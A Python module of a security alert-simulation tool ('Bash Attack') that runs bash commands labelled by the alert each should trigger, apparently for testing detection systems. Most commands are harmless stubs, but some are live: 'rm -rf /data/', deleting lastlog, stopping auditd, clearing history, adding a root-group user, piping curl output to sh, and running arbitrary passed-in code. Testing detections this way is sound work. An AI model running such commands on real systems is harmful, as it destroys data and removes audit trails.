#!/usr/bin/python3
from Agent.AaSystem.Log import PrintAndLog, PrintRedAndLog
from Agent.AaSystem.SystemInspector import GetOperatingSystemName
from Agent.AttackAgent.Bash.BashCommandExecutor import RunSubProcess


class BashCommands:
    def IpConfig(self, request):
        if str.lower(GetOperatingSystemName()) == "linux":
            return RunSubProcess("ifconfig -a")
        return RunSubProcess("ipconfig")

    def AddSuspiciousUser(self, request):
        return RunSubProcess("sudo useradd aaa -g 0")

    def SuspiciousNohup(self, request):
        return RunSubProcess("nohup cat /tmp/")

    def ReverseShell(self, request):
        return RunSubProcess("python import socket /bin/sh")

    def RemovelOfSystemLogs(self, request):
        return RunSubProcess("rm /var/log/lastlog")

    def Ransomware(self, request):
        return RunSubProcess("touch test.GNNCRY")

    def PrivilegedContainer(self, request):
        return RunSubProcess("docker run redis --privileged")

    def PossibleMalware(self, request):
        return RunSubProcess(" curl pastebin.com")

    def OverrideLinuxFiles(self, request):
        return RunSubProcess("cp /bin/netstat a")

    def LinuxReconnaissance(self, request):
        return RunSubProcess("uname -n -s -r -v")

    def LinuxBackdoor(self, request):
        return RunSubProcess("touch d-bus notifier")

    def FairwareMalware(self, request):
        return RunSubProcess("rm -rf /data/")

    def EgressData(self, request):
        return RunSubProcess("bash /dev/tcp/")

    def DownloadFileThenRun(self, request):
        return RunSubProcess("curl google.com | sh")

    def DisableFirewall(self, request):
        return RunSubProcess("touch f0VMRgIBAQ")

    def DisableAuditdLogging(self, request):
        return RunSubProcess("sudo service auditd stop")

    def CryptoMiner(self, request):
        return RunSubProcess("git clone https://github.com/cpuminer")

    def CommonBots(self, request):
        return RunSubProcess("touch RTEGFN01.dat")

    def ClearHistoryFile(self, request):
        return RunSubProcess("history -c")

    def DownloadVirusFile(self, request):
        return RunSubProcess("sudo mkdir -p ~/AriotsTemp/virus;sudo wget -O ~/AriotsTemp/virus/virus.txt https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt")

    def DownloadFile(self, request):
        if not request:
            PrintRedAndLog("Missing required parameter: download url")
        url = request[0]
        return RunSubProcess(f"sudo mkdir -p ~/AriotsTemp;sudo wget ~/AriotsTemp/ '{url}'")


class BashCommandsHelp:
    def IpConfig(self, request):
        return PrintAndLog("Performs the bash command: 'ipconfig'\n"
                           "Meant as a simple code functionality and sanity test")

    def AddSuspiciousUser(self, request):
        return PrintAndLog("Performs the bash command: 'sudo useradd aaa -g 0'\n"
                           "Triggers alert: 'AddSuspiciousUser'")

    def SuspiciousNohup(self, request):
        return PrintAndLog("Performs the bash command: 'nohup cat /tmp/'\n"
                           "Triggers alert: 'SuspiciousNohup'")

    def ReverseShell(self, request):
        return PrintAndLog("Performs the bash command: 'python import socket /bin/sh'\n"
                           "Triggers alert: 'ReverseShell'")

    def RemovelOfSystemLogs(self, request):
        return PrintAndLog("Performs the bash command: 'rm /var/log/lastlog'\n"
                           "Triggers alert: 'RemovelOfSystemLogs'")

    def Ransomware(self, request):
        return PrintAndLog("Performs the bash command: 'touch test.GNNCRY'\n"
                           "Triggers alert: 'Ransomware'")

    def PrivilegedContainer(self, request):
        return PrintAndLog("Performs the bash command: 'docker run redis --privileged'\n"
                           "Triggers alert: 'PrivilegedContainer'")

    def PossibleMalware(self, request):
        return PrintAndLog("Performs the bash command: 'curl pastebin.com'\n"
                           "Triggers alert: 'PossibleMalware'")

    def OverrideLinuxFiles(self, request):
        return PrintAndLog("Performs the bash command: 'cp /bin/netstat a'\n"
                           "Triggers alert: 'OverrideLinuxFiles'")

    def LinuxReconnaissance(self, request):
        return PrintAndLog("Performs the bash command: 'uname -n -s -r -v'\n"
                           "Triggers alert: 'LinuxReconnaissance'")

    def LinuxBackdoor(self, request):
        return PrintAndLog("Performs the bash command: 'touch d-bus notifier'\n"
                           "Triggers alert: 'LinuxBackdoor'")

    def FairwareMalware(self, request):
        return PrintAndLog("Performs the bash command: 'rm -rf /data/'\n"
                           "Triggers alert: 'FairwareMalware'")

    def EgressData(self, request):
        return PrintAndLog("Performs the bash command: 'bash /dev/tcp/'\n"
                           "Triggers alert: 'EgressData'")

    def DownloadFileThenRun(self, request):
        return PrintAndLog("Performs the bash command: 'curl google.com | sh'\n"
                           "Triggers alert: 'DownloadFileThenRun'")

    def DisableFirewall(self, request):
        return PrintAndLog("Performs the bash command: 'touch f0VMRgIBAQ'\n"
                           "Triggers alert: 'DisableFirewall'")

    def DisableAuditdLogging(self, request):
        return PrintAndLog("Performs the bash command: 'sudo service auditd stop'\n"
                           "Triggers alert: 'DisableAuditdLogging'")

    def CryptoMiner(self, request):
        return PrintAndLog("Performs the bash command: 'git clone https://github.com/cpuminer'\n"
                           "Triggers alert: 'CryptoMiner'")

    def CommonBots(self, request):
        return PrintAndLog("Performs the bash command: 'touch RTEGFN01.dat'\n"
                           "Triggers alert: 'CommonBots'")

    def ClearHistoryFile(self, request):
        return PrintAndLog("Performs the bash command: 'history -c'\n"
                           "Triggers alert: 'ClearHistoryFile'")

    def DownloadVirusFile(self, request):
        return PrintAndLog("Performs the bash command: 'wget /home "
                           "https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt'\n"
                           "Downloads a 'suspicious file from the internet")

    def DownloadFile(self, request):
        return PrintAndLog("Performs the bash command: 'wget ~/AriotsTemp/virus/virus.txt "
                           "https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt'\n"
                           "Downloads a 'suspicious file from the internet")

    def DownloadFile(self, request):
        return PrintAndLog("Receives one parameter [URL] and performs a wget request from that url\n"
                           "Performs the bash command: 'wget ~/AriotsTemp/ [requestUrl]'")


def GetBashCommandsSwitch(helpRequested=False):
    commands = BashCommands() if not helpRequested else BashCommandsHelp()
    switchOptions = {
        'getip': commands.IpConfig,
        'addsuspicioususer': commands.AddSuspiciousUser,
        'suspiciousnohup': commands.SuspiciousNohup,
        'reverseshell': commands.ReverseShell,
        'removelofsystemlogs': commands.RemovelOfSystemLogs,
        'ransomware': commands.Ransomware,
        'privilegedcontainer': commands.PrivilegedContainer,
        'possiblemalware': commands.PossibleMalware,
        'overridelinuxfiles': commands.OverrideLinuxFiles,
        'linuxreconnaissance': commands.LinuxReconnaissance,
        'linuxbackdoor': commands.LinuxBackdoor,
        'fairwaremalware': commands.FairwareMalware,
        'egressdata': commands.EgressData,
        'downloadfilethenrun': commands.DownloadFileThenRun,
        'disablefirewall': commands.DisableFirewall,
        'disableauditdlogg': commands.DisableAuditdLogging,
        'cryptominer': commands.CryptoMiner,
        'commonbots': commands.CommonBots,
        'clearhistoryfile': commands.ClearHistoryFile,
        'downloadvirusfile': commands.DownloadVirusFile,
        'downloadfile': commands.DownloadFile
    }

    return switchOptions


def HelpRequested(availableCommands):
    text = "Command parameters: ba [BashCommand]\n" \
           "ba: stands for Bash Attack. ba commands run bash code aimed at triggering alerts supporting "\
           "larger attack functions\n"\
           "     'BashCommand' - The type of Bash Command that will be run\n" \
           "     Possible BashCommands:\n"
    for command in availableCommands:
        text = f"{text}            {command}\n"
    text = f"{text}It is also possible to pass your own bash code by passing the argument -c and then the code "\
           "in parentheses, i.e.: attackagent ba -c 'ipconfig'\n"\
           "For more information on a command add -help after a command, i.e.: 'ba getip -help'"
    PrintAndLog(text)


def PerformCustomCommand(request):
    if not request:
        PrintRedAndLog("Missing bash command")
    return RunSubProcess(request[0])


def RunBashCommand(request):
    if not request:
        PrintRedAndLog(f"No Bash command to execute passed in parameters")
        return
    command = str.lower(request[0])
    availableBashCommands = GetBashCommandsSwitch().keys()
    if command == "-help":
        HelpRequested(availableBashCommands)
        return
    if command == "-c":
        PerformCustomCommand(request[1:])
        return
    if command not in availableBashCommands:
        PrintRedAndLog(f"No such Bash Attack: '{command}'")
        return
    bashCommandHelpRequested = "-help" in request
    GetBashCommandsSwitch(bashCommandHelpRequested)[command](request[1:])
